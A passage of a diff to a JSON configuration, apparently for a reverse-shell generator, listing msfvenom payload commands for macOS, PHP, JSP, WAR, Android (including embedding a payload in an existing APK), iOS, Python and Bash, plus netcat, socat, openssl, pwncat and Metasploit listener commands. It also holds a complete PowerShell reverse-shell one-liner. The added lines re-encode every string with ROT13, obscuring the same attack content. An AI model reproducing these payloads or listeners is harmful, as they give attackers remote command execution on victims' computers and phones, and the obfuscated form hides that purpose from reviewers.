+        "anzr": "znpBF Zrgrecergre Fgntrq Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c bfk/k64/zrgrecergre/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s znpub -b furyy.znpub",
+        "glcr":["znp"]
       },
       {
-        "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
-        "type":["mac"]
+        "anzr": "znpBF Zrgrecergre Fgntryrff Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c bfk/k64/zrgrecergre_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s znpub -b furyy.znpub",
+        "glcr":["znp"]
       },
       {
-        "name": "macOS Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
-        "type":["mac"]
+        "anzr": "znpBF Fgntryrff Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c bfk/k64/furyy_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s znpub -b furyy.znpub",
+        "glcr":["znp"]
       },
       {
-        "name": "PHP Meterpreter Stageless Reverse TCP",
-        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
-        "type":["windows", "linux"]
+        "anzr": "CUC Zrgrecergre Fgntryrff Erirefr GPC",
+        "pbzznaq": "zfsirabz -c cuc/zrgrecergre_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s enj -b furyy.cuc",
+        "glcr":["jvaqbjf", "yvahk"]
       },
       {
-        "name": "PHP Reverse PHP",
-        "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
-        "type":["windows", "linux"]
+        "anzr": "CUC Erirefr CUC",
+        "pbzznaq": "zfsirabz -c cuc/erirefr_cuc YUBFG={vc} YCBEG={cbeg} -b furyy.cuc",
+        "glcr":["jvaqbjf", "yvahk"]
       },
       {
-        "name": "JSP Stageless Reverse TCP",
-        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
-        "type":["windows", "linux"]
+        "anzr": "WFC Fgntryrff Erirefr GPC",
+        "pbzznaq": "zfsirabz -c wnin/wfc_furyy_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s enj -b furyy.wfc",
+        "glcr":["jvaqbjf", "yvahk"]
       },
       {
-        "name": "WAR Stageless Reverse TCP",
-        "command": "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
-        "type":["windows", "linux"]
+        "anzr": "JNE Fgntryrff Erirefr GPC",
+        "pbzznaq": "zfsirabz -c wnin/furyy_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s jne -b furyy.jne",
+        "glcr":["jvaqbjf", "yvahk"]
       },
       {
-        "name": "Android Meterpreter Reverse TCP",
-        "command": "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
-        "type":["android", "android"]
+        "anzr": "Naqebvq Zrgrecergre Erirefr GPC",
+        "pbzznaq": "zfsirabz --cyngsbez naqebvq -c naqebvq/zrgrecergre/erirefr_gpc yubfg={vc} ycbeg={cbeg} E -b znyvpvbhf.ncx",
+        "glcr":["naqebvq", "naqebvq"]
       },
       {
-        "name": "Android Meterpreter Embed Reverse TCP",
-        "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
-        "type":["android", "android"]
+        "anzr": "Naqebvq Zrgrecergre Rzorq Erirefr GPC",
+        "pbzznaq": "zfsirabz --cyngsbez naqebvq -k grzcyngr-ncc.ncx -c naqebvq/zrgrecergre/erirefr_gpc yubfg={vc} ycbeg={cbeg} -b cnlybnq.ncx",
+        "glcr":["naqebvq", "naqebvq"]
       },
       {
-        "name": "Apple iOS Meterpreter Reverse TCP Inline",
-        "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
-        "type":["apple_ios", "apple_ios"]
+        "anzr": "Nccyr vBF Zrgrecergre Erirefr GPC Vayvar",
+        "pbzznaq": "zfsirabz --cyngsbez nccyr_vbf -c nccyr_vbf/nnepu64/zrgrecergre_erirefr_gpc yubfg={vc} ycbeg={cbeg} -s znpub -b cnlybnq",
+        "glcr":["nccyr_vbf", "nccyr_vbf"]
       },
       {
-        "name": "Python Stageless Reverse TCP",
-        "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
-        "type":["windows", "linux"]
+        "anzr": "Clguba Fgntryrff Erirefr GPC",
+        "pbzznaq": "zfsirabz -c pzq/havk/erirefr_clguba YUBFG={vc} YCBEG={cbeg} -s enj",
+        "glcr":["jvaqbjf", "yvahk"]
       },
       {
-        "name": "Bash Stageless Reverse TCP",
-        "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
-        "type":["linux", "macos"]
+        "anzr": "Onfu Fgntryrff Erirefr GPC",
+        "pbzznaq": "zfsirabz -c pzq/havk/erirefr_onfu YUBFG={vc} YCBEG={cbeg} -s enj -b furyy.fu",
+        "glcr":["yvahk", "znpbf"]
       }
     ],
-    "Listener": [
+    "Yvfgrare": [
       {
-        "name": "nc",
-        "command": "nc -lvnp {port}"
+        "anzr": "ap",
+        "pbzznaq": "ap -yiac {cbeg}"
       },
       {
-        "name": "nc freebsd",
-        "command": "nc -lvn {port}"
+        "anzr": "ap serrofq",
+        "pbzznaq": "ap -yia {cbeg}"
       },
       {
-        "name": "busybox nc",
-        "command": "busybox nc -lp {port}"
+        "anzr": "ohflobk ap",
+        "pbzznaq": "ohflobk ap -yc {cbeg}"
       },
       {
-        "name": "ncat",
-        "command": "ncat -lvnp {port}"
+        "anzr": "apng",
+        "pbzznaq": "apng -yiac {cbeg}"
       },
       {
-        "name": "ncat.exe",
-        "command": "ncat.exe -lvnp {port}"
+        "anzr": "apng.rkr",
+        "pbzznaq": "apng.rkr -yiac {cbeg}"
       },
       {
-        "name": "ncat (TLS)",
-        "command": "ncat --ssl -lvnp {port}"
+        "anzr": "apng (GYF)",
+        "pbzznaq": "apng --ffy -yiac {cbeg}"
       },
       {
-        "name": "rlwrap + nc",
-        "command": "rlwrap -cAr nc -lvnp {port}"
+        "anzr": "eyjenc + ap",
+        "pbzznaq": "eyjenc -pNe ap -yiac {cbeg}"
       },
       {
-        "name": "rustcat",
-        "command": "rcat listen {port}"
+        "anzr": "ehfgpng",
+        "pbzznaq": "epng yvfgra {cbeg}"
       },
       {
-        "name": "openssl",
-        "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"
+        "anzr": "bcraffy",
+        "pbzznaq": "bcraffy erd -k509 -arjxrl efn:4096 -xrlbhg xrl.crz -bhg preg.crz -qnlf 30 -abqrf; bcraffy f_freire -dhvrg -xrl xrl.crz -preg preg.crz -cbeg {cbeg}"
       },
       {
-        "name": "pwncat",
-        "command": "python3 -m pwncat -lp {port}"
+        "anzr": "cjapng",
+        "pbzznaq": "clguba3 -z cjapng -yc {cbeg}"
       },
       {
-        "name": "pwncat (windows)",
-        "command": "python3 -m pwncat -m windows -lp {port}"
+        "anzr": "cjapng (jvaqbjf)",
+        "pbzznaq": "clguba3 -z cjapng -z jvaqbjf -yc {cbeg}"
       },
       {
-        "name": "windows ConPty",
-        "command": "stty raw -echo; (stty size; cat) | nc -lvnp {port}"
+        "anzr": "jvaqbjf PbaCgl",
+        "pbzznaq": "fggl enj -rpub; (fggl fvmr; png) | ap -yiac {cbeg}"
       },
       {
-        "name": "socat",
-        "command": "socat -d -d TCP-LISTEN:{port} STDOUT"
+        "anzr": "fbpng",
+        "pbzznaq": "fbpng -q -q GPC-YVFGRA:{cbeg} FGQBHG"
       },
       {
-        "name": "socat (TTY)",
-        "command": "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"
+        "anzr": "fbpng (GGL)",
+        "pbzznaq": "fbpng -q -q svyr:`ggl`,enj,rpub=0 GPC-YVFGRA:{cbeg}"
       },
       {
-        "name": "powercat",
-        "command": "powercat -l -p {port}"
+        "anzr": "cbjrepng",
+        "pbzznaq": "cbjrepng -y -c {cbeg}"
       },
       {
-        "name": "msfconsole",
-        "command": "msfconsole -q -x \"use multi/handler; set payload 【监听的payload类型请选择和MSFVenom反弹指令使用的-p指定的一致；其他反弹指令的payload类型使用windows/x64/meterpreter/reverse_tcp】; set lhost {ip}; set lport {port}; exploit\""
+        "anzr": "zfspbafbyr",
+        "pbzznaq": "zfspbafbyr -d -k \"hfr zhygv/unaqyre; frg cnlybnq 【监听的cnlybnq类型请选择和ZFSIrabz反弹指令使用的-c指定的一致；其他反弹指令的cnlybnq类型使用jvaqbjf/k64/zrgrecergre/erirefr_gpc】; frg yubfg {vc}; frg ycbeg {cbeg}; rkcybvg\""
       }
     ]
   },
-  "shells": ["sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"],
-  "specialCommands": {
-    "PowerShell payload": "$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  "furyyf": ["fu", "/ova/fu", "onfu", "/ova/onfu", "pzq", "cbjrefuryy", "cjfu", "nfu", "ofu", "pfu", "xfu", "mfu", "cqxfu", "gpfu", "zxfu", "qnfu"],
+  "fcrpvnyPbzznaqf": {
+    "CbjreFuryy cnlybnq": "$pyvrag = Arj-Bowrpg Flfgrz.Arg.Fbpxrgf.GPCPyvrag(\"{vc}\",{cbeg});$fgernz = $pyvrag.TrgFgernz();[olgr[]]$olgrf = 0..65535|%{0};juvyr(($v = $fgernz.Ernq($olgrf, 0, $olgrf.Yratgu)) -ar 0){;$qngn = (Arj-Bowrpg -GlcrAnzr Flfgrz.Grkg.NFPVVRapbqvat).TrgFgevat($olgrf,0, $v);$fraqonpx = (vrk $qngn 2>&1 | Bhg-Fgevat );$fraqonpx2 = $fraqonpx + \"CF \" + (cjq).Cngu + \"> \";$fraqolgr = ([grkg.rapbqvat]::NFPVV).TrgOlgrf($fraqonpx2);$fgernz.Jevgr($fraqolgr,0,$fraqolgr.Yratgu);$fgernz.Syhfu()};$pyvrag.Pybfr()"
   }
 }
